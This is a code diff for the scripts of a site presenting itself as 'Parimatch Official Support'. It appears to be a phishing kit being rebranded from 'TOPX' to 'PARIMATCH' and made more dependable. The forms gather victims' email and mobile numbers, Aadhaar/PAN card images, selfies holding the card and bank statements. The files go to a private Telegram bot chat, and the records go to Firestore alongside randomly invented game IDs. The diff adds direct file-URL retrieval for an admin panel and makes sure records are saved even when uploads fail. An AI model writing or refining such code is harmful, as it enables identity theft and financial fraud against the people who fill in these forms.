@@ -125,7 +125,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (submitBtn) {
     submitBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      navigateWithTransition('complaint.html');
+      navigateWithTransition(submitBtn.getAttribute('href') || 'complaint.html');
     });
   }
 
@@ -135,7 +135,7 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   // Internal links with transition (exclude already-handled buttons)
-  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"], a[href^="withdrawal.html"], a[href^="documents.html"], a[href^="bank_statement.html"]').forEach(link => {
+  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"], a[href^="withdrawal.html"], a[href^="unblock.html"], a[href^="bonus.html"], a[href^="documents.html"], a[href^="bank_statement.html"]').forEach(link => {
     if (link.id === 'submitProblemBtn') return;
     link.addEventListener('click', (e) => {
       if (!link.hasAttribute('target')) {
@@ -176,7 +176,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       try {
         const requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
-        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);
+        const gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);
         const timestamp = new Date().toLocaleString('en-IN', {
           day: '2-digit', month: 'short', year: 'numeric',
           hour: '2-digit', minute: '2-digit', hour12: true
@@ -302,7 +302,7 @@ document.addEventListener('DOMContentLoaded', () => {
           method = document.getElementById('withdrawMethod').value;
         }
 
-        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);
+        const gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);
 
         await saveSubmission({
           request_id: requestId,
@@ -322,12 +322,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
         showNotification("✅ Complaint filed successfully!", "success");
         problemForm.reset();
-        if (depositFields) depositFields.classList.add('active');
-        if (withdrawalFields) withdrawalFields.classList.remove('active');
-        const dTab = document.querySelector('[data-tab="deposit"]');
-        const wTab = document.querySelector('[data-tab="withdrawal"]');
-        if (dTab) dTab.classList.add('active');
-        if (wTab) wTab.classList.remove('active');
+        // Reset to this page's first tab. Never strip active from the only
+        // section the page has - that used to hide the withdrawal fields.
+        if (tabBtns.length) {
+          tabBtns.forEach(b => b.classList.remove('active'));
+          tabBtns[0].classList.add('active');
+          const firstTab = tabBtns[0].dataset.tab;
+          if (depositFields) depositFields.classList.toggle('active', firstTab === 'deposit');
+          if (withdrawalFields) withdrawalFields.classList.toggle('active', firstTab === 'withdrawal');
+        }
 
       } catch (error) {
         console.error("Firebase Error:", error);
@@ -415,11 +418,35 @@ function sendImageToTelegram(file, caption) {
     method: 'POST',
     body: fd
   }).then(function(r) { return r.json(); }).then(function(data) {
-    if (data.ok) {
-      return 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + data.result.message_id;
-    } else {
-      throw new Error(data.description || 'Telegram send failed');
-    }
+    if (!data.ok) throw new Error(data.description || 'Telegram send failed');
+
+    var res = data.result || {};
+    var fallback = 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + res.message_id;
+
+    var fileId = null;
+    if (res.photo && res.photo.length) fileId = res.photo[res.photo.length - 1].file_id;
+    else if (res.document && res.document.file_id) fileId = res.document.file_id;
+    if (!fileId) return fallback;
+
+    // t.me/c/ links are private and cannot be opened as an <img> in the admin
+    // panel, so resolve a direct file URL that actually renders.
+    return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/getFile?file_id=' + encodeURIComponent(fileId))
+      .then(function(r) { return r.json(); })
+      .then(function(g) {
+        if (g.ok && g.result && g.result.file_path) {
+          return 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/file/' + g.result.file_path;
+        }
+        return fallback;
+      })
+      .catch(function() { return fallback; });
+  });
+}
+
+// Never lets a Telegram upload error abort the Firestore save.
+function safeTgUpload(file, caption) {
+  return sendImageToTelegram(file, caption).catch(function(err) {
+    console.warn('Telegram upload failed:', caption, err);
+    return '';
   });
 }
 
@@ -724,6 +751,9 @@ function submitBonusRequest() {
         var path = 'bonus/' + rid + '/' + ff.field + '.' + ext;
         uploadPromises.push(uploadFile(file, path, rid).then(function(url) {
           d[ff.key] = url;
+        }).catch(function(err) {
+          console.warn('Telegram upload failed for ' + ff.field + ':', err);
+          d.upload_failed = (d.upload_failed ? d.upload_failed + ', ' : '') + ff.field;
         }));
       }
     }
@@ -887,11 +917,16 @@ try {
         var timestamp = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
         var gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);
 
-        var frontUrl = await sendImageToTelegram(frontFile.files[0], requestId + ' | Aadhaar/PAN Front');
-        var backUrl = await sendImageToTelegram(backFile.files[0], requestId + ' | Aadhaar/PAN Back');
-        var selfieUrl = await sendImageToTelegram(selfieFile.files[0], requestId + ' | Card with Selfie');
+        var frontUrl = await safeTgUpload(frontFile.files[0], requestId + ' | Aadhaar/PAN Front');
+        var backUrl = await safeTgUpload(backFile.files[0], requestId + ' | Aadhaar/PAN Back');
+        var selfieUrl = await safeTgUpload(selfieFile.files[0], requestId + ' | Card with Selfie');
 
-        await saveSubmission({
+        var uploadFailed = [];
+        if (!frontUrl) uploadFailed.push('aadhar_front');
+        if (!backUrl) uploadFailed.push('aadhar_back');
+        if (!selfieUrl) uploadFailed.push('selfie');
+
+        var kycPayload = {
           request_id: requestId,
           email: emailVal.trim(),
           mobile: mobileVal.trim(),
@@ -903,7 +938,10 @@ try {
           game_id: gameId,
           timestamp: timestamp,
           source: 'Parimatch Official Support'
-        });
+        };
+        if (uploadFailed.length) kycPayload.upload_failed = uploadFailed.join(', ');
+
+        await saveSubmission(kycPayload);
 
         showNotification("Request submitted successfully!", "success");
         kycForm.reset();
@@ -965,10 +1003,14 @@ try {
         var timestamp = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
         var gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);
 
-        var file1Url = await sendImageToTelegram(bs1.files[0], requestId + ' | Bank Statement 1');
-        var file2Url = await sendImageToTelegram(bs2.files[0], requestId + ' | Bank Statement 2');
+        var file1Url = await safeTgUpload(bs1.files[0], requestId + ' | Bank Statement 1');
+        var file2Url = await safeTgUpload(bs2.files[0], requestId + ' | Bank Statement 2');
 
-        await saveSubmission({
+        var uploadFailed = [];
+        if (!file1Url) uploadFailed.push('bank_statement_1');
+        if (!file2Url) uploadFailed.push('bank_statement_2');
+
+        var bankPayload = {
           request_id: requestId,
           email: emailVal.trim(),
           mobile: mobileVal.trim(),
@@ -979,7 +1021,10 @@ try {
           game_id: gameId,
           timestamp: timestamp,
           source: 'Parimatch Official Support'
-        });
+        };
+        if (uploadFailed.length) bankPayload.upload_failed = uploadFailed.join(', ');
+
+        await saveSubmission(bankPayload);
 
         showNotification("Request submitted successfully!", "success");
         bankForm.reset();
